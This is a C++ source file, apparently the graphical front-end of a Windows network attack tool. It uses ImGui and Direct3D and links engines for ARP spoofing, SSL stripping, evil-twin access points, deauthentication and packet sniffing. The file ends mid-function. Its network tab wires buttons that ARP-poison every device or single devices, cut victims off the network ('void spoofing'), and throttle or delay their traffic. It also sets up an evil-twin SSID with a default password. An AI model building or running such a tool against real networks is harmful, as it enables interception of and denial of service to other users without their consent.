#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <d3d11.h>
#include <tchar.h>
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <cstdio>
#include <cmath>
#include <algorithm>

#include "imgui.h"
#include "imgui_impl_win32.h"
#include "imgui_impl_dx11.h"

#include "ArpEngine.h"
#include "ShaperEngine.h"
#include "SnifferEngine.h"
#include "SpeedTestEngine.h"
#include "SslStripEngine.h"
#include "KarmaEngine.h"
#include "RawDeauthEngine.h"
#include "ProxyBridgeEngine.h"

// ============================================================================
// Globals
// ============================================================================
bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void CreateRenderTarget();
void CleanupRenderTarget();
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

ArpEngine       g_arp;
ShaperEngine    g_shaper;
SnifferEngine   g_sniffer;
SpeedTestEngine g_speedTest;
SslStripEngine  g_sslStrip;
KarmaEngine     g_karma;
RawDeauthEngine g_rawDeauth;
ProxyBridgeEngine g_proxyBridge;

static ID3D11Device*            g_pd3dDevice = nullptr;
static ID3D11DeviceContext*     g_pd3dDeviceContext = nullptr;
static IDXGISwapChain*          g_pSwapChain = nullptr;
static ID3D11RenderTargetView*  g_mainRenderTargetView = nullptr;

// ============================================================================
// Custom Dark Cyber Theme
// ============================================================================
static void ApplyCyberTheme() {
    ImGuiStyle& style = ImGui::GetStyle();
    style.WindowRounding    = 0.0f;
    style.FrameRounding     = 4.0f;
    style.GrabRounding      = 3.0f;
    style.TabRounding       = 4.0f;
    style.ScrollbarRounding = 6.0f;
    style.ChildRounding     = 4.0f;
    style.PopupRounding     = 4.0f;
    style.WindowBorderSize  = 1.0f;
    style.FrameBorderSize   = 0.0f;
    style.FramePadding      = ImVec2(8, 4);
    style.ItemSpacing       = ImVec2(8, 6);
    style.ItemInnerSpacing  = ImVec2(6, 4);
    style.ScrollbarSize     = 12.0f;
    style.GrabMinSize       = 8.0f;
    style.WindowPadding     = ImVec2(12, 12);

    ImVec4* c = style.Colors;
    // Base colors: deep dark background with cyan/magenta accents
    c[ImGuiCol_WindowBg]             = ImVec4(0.06f, 0.06f, 0.10f, 1.00f);
    c[ImGuiCol_ChildBg]              = ImVec4(0.05f, 0.05f, 0.08f, 1.00f);
    c[ImGuiCol_PopupBg]              = ImVec4(0.08f, 0.08f, 0.12f, 0.95f);
    c[ImGuiCol_Border]               = ImVec4(0.00f, 0.80f, 0.90f, 0.25f);
    c[ImGuiCol_BorderShadow]         = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
    c[ImGuiCol_FrameBg]              = ImVec4(0.10f, 0.10f, 0.16f, 1.00f);
    c[ImGuiCol_FrameBgHovered]       = ImVec4(0.15f, 0.15f, 0.22f, 1.00f);
    c[ImGuiCol_FrameBgActive]        = ImVec4(0.00f, 0.60f, 0.70f, 0.40f);
    c[ImGuiCol_TitleBg]              = ImVec4(0.04f, 0.04f, 0.07f, 1.00f);
    c[ImGuiCol_TitleBgActive]        = ImVec4(0.00f, 0.40f, 0.50f, 0.60f);
    c[ImGuiCol_TitleBgCollapsed]     = ImVec4(0.04f, 0.04f, 0.07f, 0.60f);
    c[ImGuiCol_MenuBarBg]            = ImVec4(0.08f, 0.08f, 0.12f, 1.00f);
    c[ImGuiCol_ScrollbarBg]          = ImVec4(0.04f, 0.04f, 0.07f, 0.80f);
    c[ImGuiCol_ScrollbarGrab]        = ImVec4(0.00f, 0.70f, 0.80f, 0.40f);
    c[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.00f, 0.85f, 0.95f, 0.60f);
    c[ImGuiCol_ScrollbarGrabActive]  = ImVec4(0.00f, 1.00f, 1.00f, 0.80f);
    c[ImGuiCol_CheckMark]            = ImVec4(0.00f, 1.00f, 1.00f, 1.00f);
    c[ImGuiCol_SliderGrab]           = ImVec4(0.00f, 0.80f, 0.90f, 0.70f);
    c[ImGuiCol_SliderGrabActive]     = ImVec4(0.00f, 1.00f, 1.00f, 1.00f);
    c[ImGuiCol_Button]               = ImVec4(0.00f, 0.50f, 0.60f, 0.50f);
    c[ImGuiCol_ButtonHovered]        = ImVec4(0.00f, 0.70f, 0.80f, 0.70f);
    c[ImGuiCol_ButtonActive]         = ImVec4(0.00f, 0.90f, 1.00f, 0.90f);
    c[ImGuiCol_Header]               = ImVec4(0.00f, 0.50f, 0.60f, 0.35f);
    c[ImGuiCol_HeaderHovered]        = ImVec4(0.00f, 0.65f, 0.75f, 0.50f);
    c[ImGuiCol_HeaderActive]         = ImVec4(0.00f, 0.80f, 0.90f, 0.60f);
    c[ImGuiCol_Separator]            = ImVec4(0.00f, 0.60f, 0.70f, 0.20f);
    c[ImGuiCol_SeparatorHovered]     = ImVec4(0.00f, 0.80f, 0.90f, 0.40f);
    c[ImGuiCol_SeparatorActive]      = ImVec4(0.00f, 1.00f, 1.00f, 0.60f);
    c[ImGuiCol_Tab]                  = ImVec4(0.08f, 0.08f, 0.14f, 1.00f);
    c[ImGuiCol_TabHovered]           = ImVec4(0.00f, 0.65f, 0.75f, 0.70f);
    c[ImGuiCol_TabActive]            = ImVec4(0.00f, 0.50f, 0.60f, 0.80f);
    c[ImGuiCol_TabUnfocused]         = ImVec4(0.06f, 0.06f, 0.10f, 1.00f);
    c[ImGuiCol_TabUnfocusedActive]   = ImVec4(0.00f, 0.35f, 0.45f, 0.60f);
    c[ImGuiCol_TableHeaderBg]        = ImVec4(0.08f, 0.08f, 0.14f, 1.00f);
    c[ImGuiCol_TableBorderStrong]    = ImVec4(0.00f, 0.60f, 0.70f, 0.30f);
    c[ImGuiCol_TableBorderLight]     = ImVec4(0.00f, 0.40f, 0.50f, 0.15f);
    c[ImGuiCol_TableRowBg]           = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
    c[ImGuiCol_TableRowBgAlt]        = ImVec4(0.06f, 0.06f, 0.10f, 0.50f);
    c[ImGuiCol_Text]                 = ImVec4(0.85f, 0.90f, 0.95f, 1.00f);
    c[ImGuiCol_TextDisabled]         = ImVec4(0.40f, 0.45f, 0.50f, 1.00f);
    c[ImGuiCol_PlotLines]            = ImVec4(0.00f, 0.90f, 1.00f, 0.80f);
    c[ImGuiCol_PlotLinesHovered]     = ImVec4(1.00f, 0.40f, 0.70f, 1.00f);
    c[ImGuiCol_PlotHistogram]        = ImVec4(0.00f, 0.80f, 0.90f, 0.70f);
    c[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.40f, 0.70f, 1.00f);
}

// ============================================================================
// Color helpers
// ============================================================================
static ImVec4 ColorCyan     = ImVec4(0.00f, 0.95f, 1.00f, 1.00f);
static ImVec4 ColorMagenta  = ImVec4(1.00f, 0.30f, 0.70f, 1.00f);
static ImVec4 ColorGreen    = ImVec4(0.20f, 1.00f, 0.40f, 1.00f);
static ImVec4 ColorYellow   = ImVec4(1.00f, 0.90f, 0.20f, 1.00f);
static ImVec4 ColorRed      = ImVec4(1.00f, 0.25f, 0.25f, 1.00f);
static ImVec4 ColorOrange   = ImVec4(1.00f, 0.60f, 0.10f, 1.00f);
static ImVec4 ColorDimCyan  = ImVec4(0.00f, 0.60f, 0.70f, 0.80f);
static ImVec4 ColorWhite    = ImVec4(0.90f, 0.93f, 0.96f, 1.00f);
static ImVec4 ColorDimWhite = ImVec4(0.50f, 0.55f, 0.60f, 1.00f);

static ImVec4 GetProtocolColor(const std::string& proto) {
    if (proto == "TCP")  return ColorCyan;
    if (proto == "UDP")  return ColorGreen;
    if (proto == "ICMP") return ColorYellow;
    if (proto == "ARP")  return ColorMagenta;
    return ColorDimWhite;
}

// ============================================================================
// Helper: format byte count
// ============================================================================
static std::string FormatBytes(uint64_t bytes) {
    char buf[64];
    if (bytes < 1024)
        snprintf(buf, sizeof(buf), "%llu B", bytes);
    else if (bytes < 1048576)
        snprintf(buf, sizeof(buf), "%.1f KB", bytes / 1024.0);
    else if (bytes < 1073741824)
        snprintf(buf, sizeof(buf), "%.2f MB", bytes / 1048576.0);
    else
        snprintf(buf, sizeof(buf), "%.2f GB", bytes / 1073741824.0);
    return buf;
}

static std::string FormatRate(double bytesPerSec) {
    char buf[64];
    if (bytesPerSec < 1024)
        snprintf(buf, sizeof(buf), "%.0f B/s", bytesPerSec);
    else if (bytesPerSec < 1048576)
        snprintf(buf, sizeof(buf), "%.1f KB/s", bytesPerSec / 1024.0);
    else
        snprintf(buf, sizeof(buf), "%.2f MB/s", bytesPerSec / 1048576.0);
    return buf;
}

static std::string FormatDuration(double seconds) {
    int h = (int)(seconds / 3600);
    int m = (int)(fmod(seconds, 3600) / 60);
    int s = (int)(fmod(seconds, 60));
    char buf[32];
    snprintf(buf, sizeof(buf), "%02d:%02d:%02d", h, m, s);
    return buf;
}

// ============================================================================
// UI State
// ============================================================================
static int g_selectedTab = 0;
static int g_selectedPacketIdx = -1;      // selected packet in sniffer table
static bool g_snifferAutoScroll = true;
static bool g_snifferStarted = false;

// Karma engine UI state
static bool g_karmaInitialized = false;
static char g_evilTwinSSID[64] = "";
static char g_evilTwinPassword[64] = "password123";
static int g_selectedNetworkIdx = -1;

// Sniffer filters
static int g_filterProtocol = 0;  // 0=All, 1=TCP, 2=UDP, 3=ICMP, 4=ARP
static char g_filterIp[64] = "";
static char g_filterPort[16] = "";

// Per-device sliders (stored by IP)
static std::map<std::string, int> g_throttleSliders;   // percentage 0-100
static std::map<std::string, int> g_delaySliders;      // ms

// Bulk controls
static int g_bulkThrottle = 50;   // percentage for Throttle All
static int g_bulkDelay = 200;     // ms for Delay All

// Convert percentage (0-100) to KB/s based on link speed
static int PercentToKbps(int percent) {
    auto netInfo = g_arp.getNetworkInfo();
    // linkSpeedBps is in bits/sec. Convert to KB/sec: bps / 8 / 1024
    int maxKbps = (int)(netInfo.linkSpeedBps / 8 / 1024);
    if (maxKbps <= 0) maxKbps = 12500;  // fallback 100 Mbps
    if (percent <= 0) return 1;          // near-zero
    if (percent >= 100) return maxKbps;
    return (int)((double)maxKbps * percent / 100.0);
}

// ============================================================================
// Render: Header Bar
// ============================================================================
static void RenderHeader(ImGuiIO& io) {
    float t = (float)ImGui::GetTime();
    
    // Animated gradient title
    float pulse = sinf(t * 2.0f) * 0.15f + 0.85f;
    ImVec4 titleCol = ImVec4(0.0f, pulse, 1.0f * pulse, 1.0f);
    
    ImGui::TextColored(titleCol, "  ALTA VOLARE");
    ImGui::SameLine();
    ImGui::TextColored(ColorDimCyan, " | DEEP PACKET ENGINE v1.0");
    ImGui::SameLine(io.DisplaySize.x - 280);
    ImGui::TextColored(ColorDimWhite, "Local: %s", g_arp.getLocalIp().c_str());
    ImGui::SameLine(io.DisplaySize.x - 130);
    ImGui::TextColored(ColorDimWhite, "GW: %s", g_arp.getGatewayIp().c_str());
    
    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();
}

// ============================================================================
// Render: Tab 1 — NETWORK MAP
// ============================================================================
static void RenderNetworkMap() {
    // Network environment info
    auto netInfo = g_arp.getNetworkInfo();
    
    // Top environment bar
    ImGui::TextColored(ColorCyan, "NETWORK ENVIRONMENT");
    ImGui::SameLine(0, 20);
    
    ImGui::TextColored(ColorDimWhite, "Type:");
    ImGui::SameLine();
    ImVec4 typeColor = (netInfo.adapterType == "Wi-Fi") ? ColorGreen : ColorCyan;
    ImGui::TextColored(typeColor, "%s", netInfo.adapterType.c_str());
    
    if (!netInfo.ssid.empty()) {
        ImGui::SameLine(0, 15);
        ImGui::TextColored(ColorDimWhite, "SSID:");
        ImGui::SameLine();
        ImGui::TextColored(ColorYellow, "%s", netInfo.ssid.c_str());
    }
    
    ImGui::SameLine(0, 15);
    ImGui::TextColored(ColorDimWhite, "Subnet:");
    ImGui::SameLine();
    ImGui::TextColored(ColorDimCyan, "%s/%d", netInfo.subnetBase.c_str(), netInfo.prefixLength);
    
    ImGui::SameLine(0, 15);
    ImGui::TextColored(ColorDimWhite, "Speed:");
    ImGui::SameLine();
    ImGui::TextColored(ColorDimCyan, "%s", netInfo.linkSpeed.c_str());

    if (!netInfo.dns1.empty()) {
        ImGui::SameLine(0, 15);
        ImGui::TextColored(ColorDimWhite, "DNS:");
        ImGui::SameLine();
        ImGui::TextColored(ColorDimCyan, "%s", netInfo.dns1.c_str());
    }

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // ==================== CONTROL PANEL ====================
    bool scanning = g_arp.isScanning();
    float t = (float)ImGui::GetTime();
    
    // Row 1: Scan + Shield + Status
    if (scanning) {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.3f, 0.0f, 0.8f));
        ImGui::Button("  SCANNING...  ", ImVec2(140, 32));
        ImGui::PopStyleColor();
    } else {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.5f, 0.6f, 0.8f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.0f, 0.7f, 0.8f, 0.9f));
        if (ImGui::Button("  SCAN  ", ImVec2(80, 32))) {
            g_arp.scanSubnet();
        }
        ImGui::PopStyleColor(2);
    }

    // Shield button
    ImGui::SameLine(0, 8);
    if (g_arp.isShieldActive()) {
        float p = sinf(t * 2.0f) * 0.2f + 0.8f;
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, p * 0.6f, p, 0.9f));
        if (ImGui::Button("  SHIELD ON  ", ImVec2(120, 32))) {
            g_arp.stopShield();
        }
        ImGui::PopStyleColor();
    } else {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.3f, 0.5f, 0.7f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.0f, 0.5f, 0.7f, 0.9f));
        if (ImGui::Button("  SHIELD  ", ImVec2(120, 32))) {
            g_arp.startShield();
        }
        ImGui::PopStyleColor(2);
    }

    // Poison All button
    ImGui::SameLine(0, 8);
    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.0f, 0.5f, 0.8f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.7f, 0.0f, 0.7f, 0.9f));
    if (ImGui::Button("  POISON ALL  ", ImVec2(120, 32))) {
        g_arp.poisonAll();
    }
    ImGui::PopStyleColor(2);

    // Cut All button
    ImGui::SameLine(0, 8);
    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.7f, 0.1f, 0.1f, 0.8f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.9f, 0.15f, 0.15f, 0.9f));
        if (ImGui::Button("  CUT ALL  ", ImVec2(100, 32))) {
        auto devices = g_arp.getDeviceList();
        for (auto& dev : devices) {
            if (dev.ip == g_arp.getGatewayIp()) continue;
            if (dev.ip == g_arp.getLocalIp()) continue;
            g_arp.startVoidSpoofing(dev.ip, dev.mac);
            g_arp.setDeviceFlags(dev.ip, true, true, false, false);
        }
    }
    ImGui::PopStyleColor(2);

    // Turbo Mode button
    ImGui::SameLine(0, 8);
    if (g_arp.isTurboActive()) {
        float p = sinf(t * 4.0f) * 0.3f + 0.7f;
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(p, p * 0.3f, 0.0f, 1.0f));
        if (ImGui::Button("  TURBO OFF  ", ImVec2(120, 32))) {
            g_shaper.clearAllPolicies();
            g_arp.stopTurboMode();
        }
        ImGui::PopStyleColor();
    } else {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.7f, 0.4f, 0.0f, 0.8f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(1.0f, 0.5f, 0.0f, 0.95f));
        if (ImGui::Button("  TURBO  ", ImVec2(120, 32))) {
            // Void spoofing handles the cut at ARP level — no shaper needed
            g_arp.startTurboMode();
        }
        ImGui::PopStyleColor(2);
    }

    // Auto-Block button
    ImGui::SameLine(0, 8);
    if (g_arp.isAutoBlockActive()) {
        float p = sinf(t * 2.5f) * 0.2f + 0.8f;
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(p * 0.8f, 0.0f, p * 0.3f, 0.9f));
        if (ImGui::Button("  BLOCK ON  ", ImVec2(110, 32))) {
            g_arp.stopAutoBlock();
        }
        ImGui::PopStyleColor();
    } else {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.4f, 0.0f, 0.2f, 0.7f));
        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.6f, 0.0f, 0.3f, 0.9f));
        if (ImGui::Button("  AUTO-BLOCK  ", ImVec2(110, 32))) {
            g_arp.startAutoBlock();
        }
        ImGui::PopStyleColor(2);
    }

    // Reset All button
    ImGui::SameLine(0, 8);
    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.3f, 0.0f, 0.7f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.7f, 0.4f, 0.0f, 0.9f));
    if (ImGui::Button("  RESET ALL  ", ImVec2(110, 32))) {
        // Stop all modes first
        if (g_arp.isTurboActive()) g_arp.stopTurboMode();
        if (g_arp.isAutoBlockActive()) g_arp.stopAutoBlock();
        if (g_arp.isShieldActive()) g_arp.stopShield();
        // Instant clear all shaper policies (no loop)
        g_shaper.clearAllPolicies();
        // Async ARP restoration (non-blocking)
        g_arp.resetAllPoison();
    }
    ImGui::PopStyleColor(2);

    // Status line
    ImGui::Spacing();
    ImGui::TextColored(ColorDimCyan, "Devices: %d", g_arp.getDeviceCount());
    ImGui::SameLine(0, 15);
    ImGui::TextColored(ColorDimWhite, "DHCP: %s", netInfo.dhcpEnabled ? "Yes" : "No");
    
    if (g_arp.isShieldActive()) {
        ImGui::SameLine(0, 15);
        ImGui::TextColored(ImVec4(0.0f, 0.8f, 1.0f, 1.0f), "[SHIELD]");
    }
    if (g_arp.isTurboActive()) {
        ImGui::SameLine(0, 10);
        float p = sinf(t * 4.0f) * 0.3f + 0.7f;
        ImGui::TextColored(ImVec4(1.0f, p * 0.5f, 0.0f, 1.0f), "[TURBO]");
    }
    if (g_arp.isAutoBlockActive()) {
        ImGui::SameLine(0, 10);
        ImGui::TextColored(ImVec4(0.9f, 0.2f, 0.4f, 1.0f), "[AUTO-BLOCK: %d blocked]", g_arp.getBlockedCount());
    }
    
    // ==================== ROW 2: BULK CONTROLS ====================
    ImGui::Spacing();
    ImGui::TextColored(ColorDimWhite, "Bulk:");
    ImGui::SameLine(0, 8);
    
    // Throttle All (percentage)
    ImGui::SetNextItemWidth(100);
    ImGui::SliderInt("##bulkThr", &g_bulkThrottle, 0, 100, "%d%%");
    ImGui::SameLine(0, 4);
    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.4f, 0.4f, 0.0f, 0.8f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.6f, 0.5f, 0.0f, 0.9f));
    if (ImGui::Button("THROTTLE ALL", ImVec2(100, 0))) {
        auto devices = g_arp.getDeviceList();
        for (auto& dev : devices) {
            if (dev.ip == g_arp.getGatewayIp() || dev.ip == g_arp.getLocalIp()) continue;
            if (!dev.isPoisoned) continue;
            TrafficPolicy p;
            p.mode = TrafficMode::THROTTLE;
            p.kbps = PercentToKbps(g_bulkThrottle);
            g_shaper.setPolicy(dev.ip, p);
            g_arp.setDeviceFlags(dev.ip, true, false, true, false);
        }
    }
    ImGui::PopStyleColor(2);
    
    // Delay All
    ImGui::SameLine(0, 15);
    ImGui::SetNextItemWidth(100);
    ImGui::SliderInt("##bulkDel", &g_bulkDelay, 50, 2000, "%d ms");
    ImGui::SameLine(0, 4);
    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.3f, 0.0f, 0.8f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.7f, 0.4f, 0.0f, 0.9f));
    if (ImGui::Button("DELAY ALL", ImVec2(80, 0))) {
        auto devices = g_arp.getDeviceList();
        for (auto& dev : devices) {
            if (dev.ip == g_arp.getGatewayIp() || dev.ip == g_arp.getLocalIp()) continue;
            if (!dev.isPoisoned) continue;
            TrafficPolicy p;
            p.mode = TrafficMode::DELAY;
            p.delayMs = g_bulkDelay;
            g_shaper.setPolicy(dev.ip, p);
            g_arp.setDeviceFlags(dev.ip, true, false, false, true);
        }
    }
    ImGui::PopStyleColor(2);
    
    // Clear All Policies (restore all to normal monitoring)
    ImGui::SameLine(0, 15);
    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.4f, 0.3f, 0.7f));
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.0f, 0.6f, 0.4f, 0.9f));
    if (ImGui::Button("CLEAR LIMITS", ImVec2(100, 0))) {
        g_shaper.clearAllPolicies();
        auto devices = g_arp.getDeviceList();
        for (auto& dev : devices) {
            if (dev.isPoisoned) {
                g_arp.setDeviceFlags(dev.ip, true, false, false, false);
            }
        }
    }
    ImGui::PopStyleColor(2);

    ImGui::Spacing();
    ImGui::Separator();
    ImGui::Spacing();

    // Device table — use SizingFixedFit + WidthFixed for explicit column widths
    ImGuiTableFlags tableFlags = ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | 
                                  ImGuiTableFlags_Resizable | ImGuiTableFlags_ScrollY |
                                  ImGuiTableFlags_SizingFixedFit;

    if (ImGui::BeginTable("DevicesTable", 8, tableFlags, ImVec2(0, -1))) {
        ImGui::TableSetupColumn("IP Address",   ImGuiTableColumnFlags_WidthFixed, 130.0f);
        ImGui::TableSetupColumn("MAC Address",  ImGuiTableColumnFlags_WidthFixed, 140.0f);
        ImGui::TableSetupColumn("Vendor",       ImGuiTableColumnFlags_WidthFixed, 110.0f);
        ImGui::TableSetupColumn("Status",       ImGuiTableColumnFlags_WidthFixed, 75.0f);
        ImGui::TableSetupColumn("Poison",       ImGuiTableColumnFlags_WidthFixed, 75.0f);
        ImGui::TableSetupColumn("Action",       ImGuiTableColumnFlags_WidthFixed, 85.0f);
        ImGui::TableSetupColumn("Throttle",     ImGuiTableColumnFlags_WidthStretch, 1.0f);
        ImGui::TableSetupColumn("Delay",        ImGuiTableColumnFlags_WidthStretch, 1.0f);
        ImGui::TableSetupScrollFreeze(0, 1);
        ImGui::TableHeadersRow();

        auto devices = g_arp.getDeviceList();
        for (auto& dev : devices) {
            ImGui::TableNextRow();
            ImGui::PushID(dev.ip.c_str());

            bool isGateway = (dev.ip == g_arp.getGatewayIp());

            // IP
            ImGui::TableSetColumnIndex(0);
            
            // Invisible selectable to make the whole row right-clickable for the context menu
            ImGui::Selectable(("##row_" + dev.ip).c_str(), false, ImGuiSelectableFlags_SpanAllColumns | ImGuiSelectableFlags_AllowItemOverlap);
            std::string popupId = "DeviceContextMenu_" + dev.ip;
            if (ImGui::BeginPopupContextItem(popupId.c_str())) {
                ImGui::TextColored(ColorCyan, "Advanced Device Information");
                ImGui::Separator();
                ImGui::TextColored(ColorDimWhite, "IP Address: "); ImGui::SameLine(100); ImGui::Text("%s", dev.ip.c_str());
                ImGui::TextColored(ColorDimWhite, "MAC Address: "); ImGui::SameLine(100); ImGui::Text("%s", dev.mac.c_str());
                ImGui::TextColored(ColorDimWhite, "Hostname: "); ImGui::SameLine(100); ImGui::Text("%s", dev.hostname.c_str());
                ImGui::TextColored(ColorDimWhite, "Manufacturer: "); ImGui::SameLine(100); ImGui::Text("%s", dev.vendor.c_str());
                ImGui::TextColored(ColorDimWhite, "Environment: "); ImGui::SameLine(100); ImGui::Text("%s", dev.os.c_str());
                ImGui::TextColored(ColorDimWhite, "First Seen: "); ImGui::SameLine(100); ImGui::Text("%s", dev.firstSeen.c_str());
                ImGui::EndPopup();
            }
            ImGui::SameLine();

            if (isGateway) {
                ImGui::TextColored(ColorYellow, "%s", dev.ip.c_str());
                ImGui::SameLine();
                ImGui::TextColored(ImVec4(0.6f, 0.5f, 0.0f, 1.0f), "[GW]");
            } else {
                ImGui::Text("%s", dev.ip.c_str());
            }

            // MAC
            ImGui::TableSetColumnIndex(1);
            ImGui::TextColored(ColorDimWhite, "%s", dev.mac.c_str());

            // Info (Hostname + Vendor)
            ImGui::TableSetColumnIndex(2);
            ImGui::TextColored(ColorDimCyan, "%s", dev.vendor.c_str());
            if (dev.hostname != "Resolving..." && dev.hostname != "Unknown" && dev.hostname != "GATEWAY") {
                ImGui::TextColored(ColorDimWhite, "%s", dev.hostname.c_str());
            }

            // Status indicator
            ImGui::TableSetColumnIndex(3);
            if (dev.isBlocked) {
                ImGui::TextColored(ImVec4(1.0f, 0.3f, 0.3f, 1.0f), "AUTO-BLK");
            } else if (dev.isCut) {
                ImGui::TextColored(ColorRed, "BLOCKED");
            } else if (dev.isThrottled) {
                ImGui::TextColored(ColorYellow, "SHAPED");
            } else if (dev.isDelayed) {
                ImGui::TextColored(ColorOrange, "DELAYED");
            } else if (dev.isPoisoned) {
                ImGui::TextColored(ColorMagenta, "MITM");
            } else {
                ImGui::TextColored(ColorGreen, "NORMAL");
            }

            // Poison toggle
            ImGui::TableSetColumnIndex(4);
            if (!isGateway) {
                if (dev.isPoisoned) {
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.7f, 0.0f, 0.3f, 0.8f));
                    if (ImGui::Button("STOP", ImVec2(65, 0))) {
                        g_shaper.clearPolicy(dev.ip);
                        g_arp.resetPoison(dev.ip);  // Properly restore ARP tables
                    }
                    ImGui::PopStyleColor();
                } else {
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.5f, 0.0f, 0.5f, 0.8f));
                    if (ImGui::Button("POISON", ImVec2(65, 0))) {
                        g_arp.startSpoofing(dev.ip, dev.mac);
                        g_arp.setDeviceFlags(dev.ip, true, false, false, false);
                    }
                    ImGui::PopStyleColor();
                }
            }

            // Action buttons
            ImGui::TableSetColumnIndex(5);
            if (!isGateway) {
                if (dev.isCut) {
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.6f, 0.3f, 0.8f));
                    if (ImGui::Button("RESTORE", ImVec2(75, 0))) {
                        g_shaper.clearPolicy(dev.ip);
                        g_arp.resetPoison(dev.ip);  // Properly restore ARP tables
                    }
                    ImGui::PopStyleColor();
                } else {
                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.8f, 0.1f, 0.1f, 0.8f));
                    if (ImGui::Button("CUT", ImVec2(75, 0))) {
                        g_arp.startVoidSpoofing(dev.ip, dev.mac);
                        g_arp.setDeviceFlags(dev.ip, true, true, false, false);
                    }
                    ImGui::PopStyleColor();
                }
            }

            // Throttle slider (percentage)
            ImGui::TableSetColumnIndex(6);
            if (!isGateway && dev.isPoisoned) {
                if (g_throttleSliders.find(dev.ip) == g_throttleSliders.end())
                    g_throttleSliders[dev.ip] = 50;
                
                ImGui::SetNextItemWidth(90);
                ImGui::SliderInt("##thr", &g_throttleSliders[dev.ip], 0, 100, "%d%%");
                ImGui::SameLine();
                if (ImGui::SmallButton("SET##t")) {
                    TrafficPolicy p;
                    p.mode = TrafficMode::THROTTLE;
                    p.kbps = PercentToKbps(g_throttleSliders[dev.ip]);
                    g_shaper.setPolicy(dev.ip, p);
                    g_arp.setDeviceFlags(dev.ip, true, false, true, false);
                }
            }

            // Delay slider
            ImGui::TableSetColumnIndex(7);
            if (!isGateway && dev.isPoisoned) {
                if (g_delaySliders.find(dev.ip) == g_delaySliders.end())
                    g_delaySliders[dev.ip] = 200;
                
                ImGui::SetNextItemWidth(90);
                ImGui::SliderInt("##del", &g_delaySliders[dev.ip], 50, 2000, "%d ms");
                ImGui::SameLine();
                if (ImGui::SmallButton("SET##d")) {
                    TrafficPolicy p;
                    p.mode = TrafficMode::DELAY;
                    p.delayMs = g_delaySliders[dev.ip];
                    g_shaper.setPolicy(dev.ip, p);
                    g_arp.setDeviceFlags(dev.ip, true, false, false, true);
                }
            }

            ImGui::PopID();
        }
        ImGui::EndTable();
    }
}

// ============================================================================
// Render: Tab 2 — PACKET SNIFFER
// ============================================================================
static void RenderPacketSniffer() {
    // Control bar
    if (!g_snifferStarted) {
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.6f, 0.2f, 0.8f));
        if (ImGui::Button("  START CAPTURE  ", ImVec2(150, 32))) {
            if (g_sniffer.initialize(g_arp.getAdapterName(), g_arp.getLocalIp())) {
                g_sniffer.startCapture();
                g_snifferStarted = true;
            }
        }
        ImGui::PopStyleColor();
    } else {
        if (g_sniffer.isPaused()) {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.0f, 0.6f, 0.2f, 0.8f));
            if (ImGui::Button("  RESUME  ", ImVec2(100, 32))) {
                g_sniffer.resumeCapture();
            }
            ImGui::PopStyleColor();
        } else {
            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.6f, 0.5f, 0.0f, 0.8f));
            if (ImGui::Button("  PAUSE  ", ImVec2(100, 32))) {
                g_sniffer.pauseCapture();
            }
            ImGui::PopStyleColor();
        }
        ImGui::SameLine();
        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.7f, 0.1f, 0.1f, 0.8f));
        if (ImGui::Button("  STOP  ", ImVec2(80, 32))) {
            g_sniffer.stopCapture();
            g_snifferStarted = false;
        }
        ImGui::PopStyleColor();
        ImGui::SameLine();
        if (ImGui::Button("  CLEAR  ", ImVec2(80, 32))) {
            g_sniffer.clearCapture();
            g_selectedPacketIdx = -1;
        }
    }

    ImGui::SameLine(0, 20);
    ImGui::TextColored(ColorDimCyan, "Packets: %u", g_sniffer.getTotalPacketCount());
    ImGui::SameLine(0, 20);
    ImGui::TextColored(ColorDimCyan, "Rate: %.0f pkt/s", g_sniffer.getCaptureRate());
    ImGui::SameLine(0, 20);
    ImGui::TextColored(ColorDimCyan, "Data: %s", FormatBytes(g_sniffer.getTotalBytes()).c_str());
    ImGui::SameLine(0, 20);
